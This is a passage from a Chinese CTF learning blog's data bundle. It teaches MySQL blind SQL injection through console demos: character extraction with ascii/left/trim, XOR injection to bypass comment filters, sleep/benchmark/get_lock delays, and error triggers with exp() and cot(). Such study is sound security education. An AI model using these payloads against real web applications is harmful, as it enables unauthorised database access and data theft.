ascii('a')-98;\n+--------------------+\n| 0 or ascii('a')-98 |\n+--------------------+\n|                  1 |\n+--------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 异或\n\n * Xor逻辑异或\n * ^按位异或\n\nmysql> select 1^1^1;\n+-------+\n| 1^1^1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\nmysql> select 1^0^1;\n+-------+\n| 1^0^1 |\n+-------+\n|     0 |\n+-------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nmysql> select 1^(ascii('a')-96)^1;\n+---------------------+\n| 1^(ascii('a')-96)^1 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1^(ascii('a')-97)^1;\n+---------------------+\n| 1^(ascii('a')-97)^1 |\n+---------------------+\n|                   0 |\n+---------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n异或有一个著名的注入方法：异或注入\n\n当题目不允许使用❌❌❌注释符❌❌❌的时候，需要用到异或注入\n\n以前我们用以下方式注入，加粗字体即为我们的输入\n\nwhere id = ' **1' and 1=1 -- **' 或where id = ' 1' and 1=1 #'\n\n不用注释符号的话，我们可以用以下方法绕过\n\nwhere id = '1'^(substr()='a')^'1'\n\n在上述条件中，我们中间用到了一个布尔表达式，用字“符串截取和比较这”两个部分来组成，这个表达式会返回1或者0，这个1或者0影响着异或的结果。\n\n同样我们除了^异或符号以外，还可以用等于号\n\nmysql> select '1'=(1=1)='1';\n+---------------+\n| '1'=(1=1)='1' |\n+---------------+\n|             1 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'=(1=2)='1';\n+---------------+\n| '1'=(1=2)='1' |\n+---------------+\n|             0 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'^(1=1)^'1';\n+---------------+\n| '1'^(1=1)^'1' |\n+---------------+\n|             1 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'^(1=2)^'1';\n+---------------+\n| '1'^(1=2)^'1' |\n+---------------+\n|             0 |\n+---------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 拓展\n\n# 异或定义：\n\n在 MySQL 中，异或（^）是一个逻辑运算符，用于对两个布尔值（真或假）或两个整数的二进制位进行操作。\n\n 1. 布尔值的异或操作规则：当两个布尔值不同时，结果为真（1）；当两个布尔值相同时，结果为假（0）。例如，true ^ false的结果是true，false ^ false的结果是false\n 2. 整数二进制位的异或操作规则：对两个整数的二进制表示逐位进行异或操作。当对应的二进制位不同时，结果位为1；当对应的二进制位相同时，结果位为0。例如，对于整数5（二进制为101）和3（二进制为011），5 ^ 3的计算过程是101 ^ 011 = 110（二进制），转换为十进制是6。\n\n# 分析SELECT 1^1^1;的运算过程\n\n首先，计算1^1\n\n 1. 数字 1 的二进制表示是0001（为了方便说明，这里以 4 位二进制为例，实际在计算机中根据数据类型的不同长度会有所不同）。\n 2. 那么1^1就是0001 ^ 0001，按照异或规则，相同位为 0，所以结果是0000，转换为十进制就是 0。\n\n然后，计算0^1\n\n（上一步的结果 0 和最后一个 1 进行异或）\n\n * 0 的二进制表示是0000，1 的二进制表示是0001。\n * 进行异或操作0000 ^ 0001，不同位为 1，结果是0001，转换为十进制就是 1。\n\n如果用布尔值来理解的话：\n\n * 在 MySQL 中，布尔值的真可以用 1 表示，假可以用 0 表示。当把 1 看作布尔值（即真）时，异或运算规则是两个布尔值不同时结果为真（1），相同时结果为假（0）。\n * 对于SELECT 1^1^1，先看前两个 1 的异或：1（真）^ 1（真），根据布尔值异或规则，结果为假（0）。然后再用这个结果（0，看作假）与最后一个 1（真）进行异或，0（假）^ 1（真），结果为真（1）。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第28天\n\n\n\n * 书接上回\n   * 如果ascii()函数被过滤了怎么办？\n * left()函数\n * trim()函数\n   * 定义：\n   * 同类型的函数：\n   * 其他用法：\n * 比较\n   * 等于\n   * 大于 小于\n   * like模糊匹配\n   * 正则表达式 regexp/rlike\n   * 范围比较关键字between\n   * in 关键字\n   * and逻辑与运算符\n   * or或运算\n   * 异或\n   * 拓展\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第12章：布尔盲注2\n\n\n# 书接上回\n\n我们使用ascii()函数的好处是：\n\n 1. 可以免除乱七八糟的符号的干扰\n 2. 让right等函数本来不是精确的截取变成了精确的截取\n 3. 字符转换为数字后，能进行大于号、小于号的比较\n\nmysql> select ascii(right('abcdef',4))>1;\n+----------------------------+\n| ascii(right('abcdef',4))>1 |\n+----------------------------+\n|                          1 |\n+----------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',4))>100;\n+------------------------------+\n| ascii(right('abcdef',4))>100 |\n+------------------------------+\n|                            0 |\n+------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select ascii(right('abcdef',4))>50;\n+-----------------------------+\n| ascii(right('abcdef',4))>50 |\n+-----------------------------+\n|                           1 |\n+-----------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n我们可以用大于、小于做比较，用二分查找来找到目标的字母。\n\n如果我们用字符来比较的话，逐个比较比较浪费时间，转为ascii后用二分查找要大大节省时间和流量\n\n\n# 如果ascii()函数被过滤了怎么办？\n\n如果ascii()函数被过滤了，我们可以使用ascii的同名函数ord()\n\n\n# left()函数\n\nleft()函数的使用方法基本和right()函数相同，left(str,len)，和right()不同的点在于是从左截取，导致首字母一直是第一个字母不变，不能用ascii()的函数，但有天才想出来可以用resverse()函数，将left的结果倒过来，倒过来以后就能用ascii码了。\n\nmysql> select left('abc',1);\n+---------------+\n| left('abc',1) |\n+---------------+\n| a             |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select left('abc',2);\n+---------------+\n| left('abc',2) |\n+---------------+\n| ab            |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select left('abc',3);\n+---------------+\n| left('abc',3) |\n+---------------+\n| abc           |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select reverse(left('abc',3));\n+------------------------+\n| reverse(left('abc',3)) |\n+------------------------+\n| cba                    |\n+------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# trim()函数\n\n\n# 定义：\n\ntrim()函数：过滤指定的字符串，最常见的用途是移除字首或字尾的空白。\n\n\n# 同类型的函数：\n\n在mysql中：trim()、ltrim()、rtrim()\n\n * trim()删除前后空格\n * ltrim()删除字符串结尾空格\n * rtrim()删除字符串起始空格\n\n\n# 其他用法：\n\nboth前后都移除，leading移除前面的，trailing移除后边的。\n\ntrim([both/leading/trailing] 目标字符串 from 源字符串)\n\n\n1\n\n\n举例：\n\nmysql> select trim(leading 'a' from 'abcd');\n+-------------------------------+\n| trim(leading 'a' from 'abcd') |\n+-------------------------------+\n| bcd                           |\n+-------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select trim(leading 'b' from 'abcd');\n+-------------------------------+\n| trim(leading 'b' from 'abcd') |\n+-------------------------------+\n| abcd                          |\n+-------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n以上结果表明，如果用leading这种移除只能移除开头是指定字符的，此时我们可以加一些技巧，让他可以精确的截取（这个技巧简直是天才的想法）\n\n# i表示一个字符的意思，比如i=a，则i+1=b，i+2=c\n# 设i=x，i+1是y，字符串只有确定的一个字符是起始，所以对两个的trim leading进行比较\n# xy如果都不是起始，等于号左右两边都是abcd，比较后会返回1，如果xy中有一个是起始，这个比较就会返回0\ntrim(leading i from 'abcd') = trim(leading i+1 from 'abcd')\n\n# 循环执行上一步，抽象理解我们的结果锁定在了i和i+1这两者之间，我们对i+1和i+2再进行一次比较\n# 如果说i+1和i+2的trim相等了，说明首字符就是i，如果i+1和i+2不相等，说明首字符是i+1\ntrim(leading i+2 from 'abcd') = trim(leading i+1 from 'abcd')\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n类似的，我们用trim还有多种方法能做精确的截取，比如trim i和trim i+1比较长度，或者是和源字符串进行比较，所以刚才列举的方法并不是唯一的方法。\n\n\n# 比较\n\n\n# 等于\n\nselect substr(database(),1,1)='a'\n\n\n1\n\n\n\n# 大于 小于\n\nmysql> select 2>1;\n+-----+\n| 2>1 |\n+-----+\n|   1 |\n+-----+\n1 row in set (0.00 sec)\n\nmysql> select 'b'>'a';\n+---------+\n| 'b'>'a' |\n+---------+\n|       1 |\n+---------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n特别需要注意的是：在比较字符串的时候，看的只是首字符\n\nmysql> select 'b'>'abcdef';\n+--------------+\n| 'b'>'abcdef' |\n+--------------+\n|            1 |\n+--------------+\n1 row in set (0.00 sec)\n\nmysql> select 'b'>'cdef';\n+------------+\n| 'b'>'cdef' |\n+------------+\n|          0 |\n+------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# like模糊匹配\n\n> 在 mysql 中，like是一个用于模糊匹配的关键字，主要用于在select、update、delete等语句中对字符型数据进行模式匹配。它可以帮助你查找那些满足某种模糊条件的记录，例如查找所有以某个字符开头或者包含某个字符的字符串。使用百分号%来表示任意字符，使用下划线_表示单个字符。\n\nmysql> show databases;\n+--------------------+\n| database           |\n+--------------------+\n| base               |\n| sys                |\n| tale               |\n| test               |\n+--------------------+\n.. rows in set (0.01 sec)\n\nmysql> select database() like 't%';\n+----------------------+\n| database() like 't%' |\n+----------------------+\n|                    1 |\n+----------------------+\n1 row in set (0.00 sec)\n\nmysql> select database() like 'a%';\n+----------------------+\n| database() like 'a%' |\n+----------------------+\n|                    0 |\n+----------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n\n\n通过以上案例可以了解到一些特性，这样返回的结果是一个布尔值，只能表示有或没有\n\nmysql> select 1 like '1';\n+------------+\n| 1 like '1' |\n+------------+\n|          1 |\n+------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 like 1;\n+----------+\n| 1 like 1 |\n+----------+\n|        1 |\n+----------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n🙋‍♂️通过以上案例可以看到，当使用like操作符时，数字会被隐式地转换为字符类型，然后再进行模式匹配\n\n🙋‍♂️如果没有使用百分号%，like子句与等于号=是一样的。\n\n\n# 正则表达式 regexp/rlike\n\n如果我们有个test的数据库，而我们执行以下语句，得到结果为真\n\nmysql> select database() regexp '^te';\n+-------------------------+\n| database() regexp '^te' |\n+-------------------------+\n|                       1 |\n+-------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n需要注意的是，regexp是不区分大小写的，需要大小写敏感的话需要加上binary关键字\n\nmysql> select binary database() rlike '^tes';\n+--------------------------------+\n| binary database() rlike '^tes' |\n+--------------------------------+\n|                              1 |\n+--------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select binary database() rlike '^tes';\n+--------------------------------+\n| binary database() rlike '^tes' |\n+--------------------------------+\n|                              0 |\n+--------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n\n# 范围比较关键字between\n\nexpr [not] between bgin_expr and end_expr;\n\n * between筛选的是expr>=begin_expr并且expr<=end_expr的数据，如果不存在则返回的是0；\n * not between筛选的是expr<begin_expr或者expr>endexpr的数据，如果不存在则返回的是0；\n * 如果expr返回的是null，则between返回的也是null；\n\nmysql> select 2 between 1 and 3;\n+-------------------+\n| 2 between 1 and 3 |\n+-------------------+\n|                 1 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select 2 between 2 and 2;\n+-------------------+\n| 2 between 2 and 2 |\n+-------------------+\n|                 1 |\n+-------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n不建议用between 2 and 3，这样符合条件的有多个，因为是闭区间，完全可以限定死只能是between 2 and 2\n\n\n# in 关键字\n\nin对大小写也不敏感，字符和数字都可以用in，同样我们也有not in\n\nmysql> select 'a' in('a','b','c');\n+---------------------+\n| 'a' in('a','b','c') |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 in (1);\n+----------+\n| 1 in (1) |\n+----------+\n|        1 |\n+----------+\n1 row in set (0.00 sec)\n\nmysql> select 'a' in ('a');\n+--------------+\n| 'a' in ('a') |\n+--------------+\n|            1 |\n+--------------+\n1 row in set (0.00 sec)\n\nmysql> select binary 'a' in('a');\n+--------------------+\n| binary 'a' in('a') |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# and逻辑与运算符\n\n * 1与任何字符and运算都是0\n * 1与任何非0数字and运算都是1\n\nmysql> select 1 and '0';\n+-----------+\n| 1 and '0' |\n+-----------+\n|         0 |\n+-----------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and 0;\n+---------+\n| 1 and 0 |\n+---------+\n|       0 |\n+---------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a');\n+------------------+\n| 1 and ascii('a') |\n+------------------+\n|                1 |\n+------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n&&：这是逻辑与运算 和and一样\n\n&：这是按位与运算\n\nmysql> select 1 and ascii('a')-96;\n+---------------------+\n| 1 and ascii('a')-96 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a')-97;\n+---------------------+\n| 1 and ascii('a')-97 |\n+---------------------+\n|                   0 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1 and ascii('a')-98;\n+---------------------+\n| 1 and ascii('a')-98 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n由以上案例我们可以在盲注中用and来判读， ascii('a')-97做了and判断后结果显示0，说明字符是chr(97)\n\n\n# or或运算\n\n * ||等价于or\n * |是按位或\n\nmysql> select 0 or ascii('a')-96;\n+--------------------+\n| 0 or ascii('a')-96 |\n+--------------------+\n|                  1 |\n+--------------------+\n1 row in set (0.00 sec)\n\nmysql> select 0 or ascii('a')-97;\n+--------------------+\n| 0 or ascii('a')-97 |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (0.00 sec)\n\nmysql> select 0 or ascii('a')-98;\n+--------------------+\n| 0 or ascii('a')-98 |\n+--------------------+\n|                  1 |\n+--------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\n\n# 异或\n\n * xor逻辑异或\n * ^按位异或\n\nmysql> select 1^1^1;\n+-------+\n| 1^1^1 |\n+-------+\n|     1 |\n+-------+\n1 row in set (0.00 sec)\n\nmysql> select 1^0^1;\n+-------+\n| 1^0^1 |\n+-------+\n|     0 |\n+-------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\nmysql> select 1^(ascii('a')-96)^1;\n+---------------------+\n| 1^(ascii('a')-96)^1 |\n+---------------------+\n|                   1 |\n+---------------------+\n1 row in set (0.00 sec)\n\nmysql> select 1^(ascii('a')-97)^1;\n+---------------------+\n| 1^(ascii('a')-97)^1 |\n+---------------------+\n|                   0 |\n+---------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n异或有一个著名的注入方法：异或注入\n\n当题目不允许使用❌❌❌注释符❌❌❌的时候，需要用到异或注入\n\n以前我们用以下方式注入，加粗字体即为我们的输入\n\nwhere id = ' **1' and 1=1 -- **' 或where id = ' 1' and 1=1 #'\n\n不用注释符号的话，我们可以用以下方法绕过\n\nwhere id = '1'^(substr()='a')^'1'\n\n在上述条件中，我们中间用到了一个布尔表达式，用字“符串截取和比较这”两个部分来组成，这个表达式会返回1或者0，这个1或者0影响着异或的结果。\n\n同样我们除了^异或符号以外，还可以用等于号\n\nmysql> select '1'=(1=1)='1';\n+---------------+\n| '1'=(1=1)='1' |\n+---------------+\n|             1 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'=(1=2)='1';\n+---------------+\n| '1'=(1=2)='1' |\n+---------------+\n|             0 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'^(1=1)^'1';\n+---------------+\n| '1'^(1=1)^'1' |\n+---------------+\n|             1 |\n+---------------+\n1 row in set (0.00 sec)\n\nmysql> select '1'^(1=2)^'1';\n+---------------+\n| '1'^(1=2)^'1' |\n+---------------+\n|             0 |\n+---------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n\n# 拓展\n\n# 异或定义：\n\n在 mysql 中，异或（^）是一个逻辑运算符，用于对两个布尔值（真或假）或两个整数的二进制位进行操作。\n\n 1. 布尔值的异或操作规则：当两个布尔值不同时，结果为真（1）；当两个布尔值相同时，结果为假（0）。例如，true ^ false的结果是true，false ^ false的结果是false\n 2. 整数二进制位的异或操作规则：对两个整数的二进制表示逐位进行异或操作。当对应的二进制位不同时，结果位为1；当对应的二进制位相同时，结果位为0。例如，对于整数5（二进制为101）和3（二进制为011），5 ^ 3的计算过程是101 ^ 011 = 110（二进制），转换为十进制是6。\n\n# 分析select 1^1^1;的运算过程\n\n首先，计算1^1\n\n 1. 数字 1 的二进制表示是0001（为了方便说明，这里以 4 位二进制为例，实际在计算机中根据数据类型的不同长度会有所不同）。\n 2. 那么1^1就是0001 ^ 0001，按照异或规则，相同位为 0，所以结果是0000，转换为十进制就是 0。\n\n然后，计算0^1\n\n（上一步的结果 0 和最后一个 1 进行异或）\n\n * 0 的二进制表示是0000，1 的二进制表示是0001。\n * 进行异或操作0000 ^ 0001，不同位为 1，结果是0001，转换为十进制就是 1。\n\n如果用布尔值来理解的话：\n\n * 在 mysql 中，布尔值的真可以用 1 表示，假可以用 0 表示。当把 1 看作布尔值（即真）时，异或运算规则是两个布尔值不同时结果为真（1），相同时结果为假（0）。\n * 对于select 1^1^1，先看前两个 1 的异或：1（真）^ 1（真），根据布尔值异或规则，结果为假（0）。然后再用这个结果（0，看作假）与最后一个 1（真）进行异或，0（假）^ 1（真），结果为真（1）。",charsets:{cjk:!0},lastUpdated:"2024/12/15, 20:52:37",lastUpdatedTimestamp:1734267157e3},{title:"20241215CTF学习笔记12",frontmatter:{title:"20241215CTF学习笔记12",date:"2024-12-15T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-15-CTFLearn.html",relativePath:"views/numerology/2024-12-15-CTFLearn.md",key:"v-8206a9fc",path:"/views/numerology/2024-12-15-CTFLearn.html",headers:[{level:2,title:"适用场景：",slug:"适用场景",normalizedTitle:"适用场景：",charIndex:43},{level:3,title:"if方法延时盲注",slug:"if方法延时盲注",normalizedTitle:"if方法延时盲注",charIndex:54},{level:3,title:"Case方法延时忙注",slug:"case方法延时忙注",normalizedTitle:"case方法延时忙注",charIndex:68},{level:3,title:"延时的基本方法",slug:"延时的基本方法",normalizedTitle:"延时的基本方法",charIndex:84},{level:3,title:"其他方法",slug:"其他方法",normalizedTitle:"其他方法",charIndex:97},{level:2,title:"报错盲注",slug:"报错盲注",normalizedTitle:"报错盲注",charIndex:105},{level:3,title:"一般形式",slug:"一般形式",normalizedTitle:"一般形式",charIndex:115},{level:3,title:"举例引入问题：",slug:"举例引入问题",normalizedTitle:"举例引入问题：",charIndex:125},{level:3,title:"exp()函数：",slug:"exp-函数",normalizedTitle:"exp()函数：",charIndex:138},{level:3,title:"cot()三角函数",slug:"cot-三角函数",normalizedTitle:"cot()三角函数",charIndex:152}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第29天</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>视频地址【<a href="https://www.bilibili.com/video/BV1Lh411F7s8/" target="_blank" rel="noopener noreferrer">🔗传送门<OutboundLink/></a>】</li>\n</ul>\n',headersStr:"适用场景： if方法延时盲注 Case方法延时忙注 延时的基本方法 其他方法 报错盲注 一般形式 举例引入问题： exp()函数： cot()三角函数",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第29天\n\n\n\n * 适用场景：\n   * if方法延时盲注\n   * Case方法延时忙注\n   * 延时的基本方法\n   * 其他方法\n * 报错盲注\n   * 一般形式\n   * 举例引入问题：\n   * exp()函数：\n   * cot()三角函数\n\n\n\n * 视频地址【🔗传送门】\n\n\n# 第13章：延时盲注\n\n> 延时盲注考的不太多\n> \n> 大概算了一下，这个视频系列有100集，如果按照每天1集的速度，学完至少要三个月，太慢了，需要加快速度了。\n\n\n# 适用场景：\n\n如果现在不给返回布尔型的状态了，比如“登录成功”、“登录失败”。现在都返回的是查询成功，这种情况下用延时盲注\n\n\n# if方法延时盲注\n\nmysql> select if(1=1,1,0);\n+-------------+\n| if(1=1,1,0) |\n+-------------+\n|           1 |\n+-------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\nmysql>  select if(1=1,sleep(5),0);\n+--------------------+\n| if(1=1,sleep(5),0) |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (5.01 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n一般形式：if(exp1,exp2,exp3)\n\n意思是，如果表达式1成立，就返回表达式2，否则就返回表达式3。\n\n\n# Case方法延时忙注\n\nmysql> select case 'a' when 'a' then 1 else 0 end;\n+-------------------------------------+\n| case 'a' when 'a' then 1 else 0 end |\n+-------------------------------------+\n|                                   1 |\n+-------------------------------------+\n1 row in set (0.00 sec)\n\nmysql> select case when 'a'='a' then 1 else 0 end;\n+-------------------------------------+\n| case when 'a'='a' then 1 else 0 end |\n+-------------------------------------+\n|                                   1 |\n+-------------------------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n\n\n一般形式：case exp1 when exp2\n\ncase when then 有两种写法\n\n * 一种是案例1的case一个字符，when一个字符\n * 一种是案例2的case什么也不加，when一个表达式\n\n\n# 延时的基本方法\n\n用sleep()函数，括号里单位是秒\n\n我们只需要构造case或者if条件表达式，然后满足条件就让他延时，看网页加载的长短就能观察出延时成功了还是没成功，进而可以判断出条件表达式的真假，通过表达式的真假就可以把数据给注入出来（简直天才的想法）\n\n\n# 其他方法\n\n如果过滤了sleep()同时又没有回显，只能延时注入，该怎么办？\n\nps：mysql中只有sleep这一个延时函数。\n\n解决方案：\n\n 1. benchmark()：这个函数可以测试某些特定操作的执行速度，参数可以是需要执行的次数和表达式，表达式可以是任何的标量表达式，比如返回值是标量的子查询或者函数，该函数可以很方便地测试某些特定操作的性能，比如通过测试可以发现，MD5()函数要比SHA1()函数要快。\n    \n    mysql> select benchmark(1000000,md5('Flag'));\n    +--------------------------------+\n    | benchmark(1000000,md5('Flag')) |\n    +--------------------------------+\n    |                              0 |\n    +--------------------------------+\n    1 row in set (0.13 sec)\n    \n    mysql> select benchmark(1000000,sha1('Flag'));\n    +---------------------------------+\n    | benchmark(1000000,sha1('Flag')) |\n    +---------------------------------+\n    |                               0 |\n    +---------------------------------+\n    1 row in set (0.48 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    \n\n 2. **笛卡尔积：**主要用count()函数，一般是用count(*)或者count(1)，又或者count(列名)。根据列是不是主键而会影响到性能。\n    \n    mysql> select count(*) from account;\n    +----------+\n    | count(*) |\n    +----------+\n    |        1 |\n    +----------+\n    1 row in set (0.02 sec)\n    \n    mysql> select * from account;\n    +-----+-------+---------+\n    | aid | name  | balance |\n    +-----+-------+---------+\n    |   1 | admin |       1 |\n    +-----+-------+---------+\n    1 row in set (0.00 sec)\n    \n    mysql> select count(*) from account A,account B;\n    +----------+\n    | count(*) |\n    +----------+\n    |        1 |\n    +----------+\n    1 row in set (0.00 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    18\n    19\n    20\n    21\n    22\n    23\n    \n\n 3. get_lock：这是一种比较神奇的利用技巧，延时是精确可控的，但问题在于并不是所有的站都适用\n    \n    mysql> select get_lock('flag',1);\n    +--------------------+\n    | get_lock('flag',1) |\n    +--------------------+\n    |                  1 |\n    +--------------------+\n    1 row in set (0.00 sec)\n    \n    # 此时我们重新开个窗口，需要换个session\n    mysql> select get_lock('flag',5);\n    +--------------------+\n    | get_lock('flag',5) |\n    +--------------------+\n    |                  1 |\n    +--------------------+\n    1 row in set (5.02 sec)\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    12\n    13\n    14\n    15\n    16\n    17\n    \n    \n    在一个session中可以先锁定一个变量，然后通过另一个session再次执行get_lock函数，此时会产生5秒的延迟，其效果类似于sleep(5)，当然之后可以用reRELEASE_LOCK()函数释放\n\n 4. **正则表达式：**正则表达式在匹配较长的字符串但自由度比较高的字符串时，会造成较大的计算量，我们通过rpad或者repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。\n    \n    mysql> select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');\n    +-------------------------------------------------------------+\n    | rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |\n    +-------------------------------------------------------------+\n    |                                                        NULL |\n    +-------------------------------------------------------------+\n    1 row in set, 1 warning (0.00 sec)\n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    \n\n以上延时都考的挺少的。\n\n\n# 第14章：报错盲注\n\n\n# 报错盲注\n\n\n# 一般形式\n\nif error , return ERR\n\nELSE return OK!\n\n\n# 举例引入问题：\n\nif((substr='a'), 执行某个函数执行过程中报错, 0)\n\n\n1\n\n\n这个函数执行过程中报错，可不是随便自己起一个乱七八糟的函数名就可以的，这样只会在select一执行就报错。\n\n我们可以使用两种函数：exp()和cot()\n\n\n# exp()函数：\n\n作用：会返回自然对数，也就是e的多少次方。\n\nmysql>  select if(1=1,sleep(5),0);\n+--------------------+\n| if(1=1,sleep(5),0) |\n+--------------------+\n|                  0 |\n+--------------------+\n1 row in set (5.01 sec)\n\nmysql> select exp(1);\n+-------------------+\n| exp(1)            |\n+-------------------+\n| 2.718281828459045 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(5);\n+-------------------+\n| exp(5)            |\n+-------------------+\n| 148.4131591025766 |\n+-------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(500);\n+------------------------+\n| exp(500)               |\n+------------------------+\n| 1.4035922178528375e217 |\n+------------------------+\n1 row in set (0.00 sec)\n\nmysql> select exp(5000);\nERROR 1690 (22003): DOUBLE value is out of range in 'exp(5000)'\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n\n\n我们有了以上exp函数，我们可以试一下if里边用exp\n\nmysql> select if((1=1),exp(5000),0);\nERROR 1690 (22003): DOUBLE value is out of range in 'exp(5000)'\nmysql> select if((1=2),exp(5000),0);\n+-----------------------+\n| if((1=2),exp(5000),0) |\n+-----------------------+\n|                     0 |\n+-----------------------+\n1 row in set (0.00 sec)\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# cot()三角函数\n\n这个可以直接用select cot(0)\n\nmysql> select cot(0);\nERROR 1690 (22003): DOUBLE value is out of range in 'cot(0)'\n\n\n1\n2\n\n\n> 余切函数(\\cot(x))的表达式为： $$ [ \\cot(x)=\\frac{\\cos(x)}{\\sin(x)} ] $$ 当(x = 